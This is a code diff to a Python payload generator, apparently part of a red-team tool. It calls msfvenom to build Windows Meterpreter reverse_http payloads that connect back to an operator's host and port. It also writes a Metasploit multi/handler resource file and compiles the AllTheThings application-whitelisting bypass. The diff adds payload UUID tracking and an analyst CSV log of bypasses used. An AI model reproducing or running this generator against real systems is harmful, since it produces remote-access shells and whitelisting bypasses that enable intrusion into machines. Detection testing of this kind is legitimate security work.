@@ -3,6 +3,8 @@ from display import *
 import os
 import re
 import base64
+import string
+import random
 
 class Generator():
 
@@ -11,6 +13,7 @@ class Generator():
 		#TODO fix to use string .format, remove the filewrite
 		code = ''
 		form = 'c'
+		uuid = name + str(self.id_generator())
 
 		if shellProcess == 'hexEncode':
 			form = "c"
@@ -22,11 +25,13 @@ class Generator():
 			form = "psh"
 
 		if (arch  == "x86"):
-			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + name +"LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
-			self.generateMetasploitReourceFile(host, port)
+			os.system("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + uuid +" LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+			self.genMetasploitReourceFile(host, port)
+			self.genAnalystCSVFile(name, uuid)
 		else:
-			os.system("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + name + "LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
-			self.generateMetasploitReourceFile(host, port)
+			os.system("msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_http PayloadUUIDTracking=true PayloadUUIDName=" + uuid + " LHOST="+host+" LPORT="+port+" -f "+form+" > /tmp/metasploit 2> /dev/null")
+			self.genMetasploitReourceFile(host, port)
+			self.genAnalystCSVFile(name, uuid)
 		with open("/tmp/metasploit", 'rb') as f:
 			code = f.read()
 
@@ -108,7 +113,7 @@ class Generator():
 
 	def compileAllTheThings(self, name):
 		build_steps = [
-				"apt-get install mono-complete -y",
+				"apt-get install mono-complete -y >/dev/null 2>&1",
 				"git clone https://github.com/ConsciousHacker/AllTheThings >/dev/null 2>&1",
 				"wget -O https://github.com/mono/nuget-binary/raw/master/nuget.exe >/dev/null 2>&1",
 				"cp ./GenerateAll/allthethings.cs ./AllTheThings/AllTheThings/Program.cs >/dev/null 2>&1",
@@ -126,7 +131,7 @@ class Generator():
 		with open('./GenerateAll/gr8sct.sh', 'w+') as f:
 			f.write(script)
 
-	def generateMetasploitReourceFile(self, host, port):
+	def genMetasploitReourceFile(self, host, port):
 		# TODO: make dynamic for arch
 		msfrc = '''use exploit/multi/handler
 set TimestampOutput true
@@ -141,3 +146,11 @@ run -j'''.format(host, port)
 		with open('./GenerateAll/gr8sct.rc', 'w') as f:
 			f.write(msfrc)
 
+	def genAnalystCSVFile(self, bypass, uuid):
+		with open("./GenerateAll/analyst.csv", 'a') as f:
+			f.write(bypass + ',' + uuid + ',' + 'FALSE' + '\n')
+
+	def id_generator(self, size=6, chars=string.ascii_uppercase):
+		uuid = ''.join(random.choice(chars) for _ in range(size))
+
+		return uuid
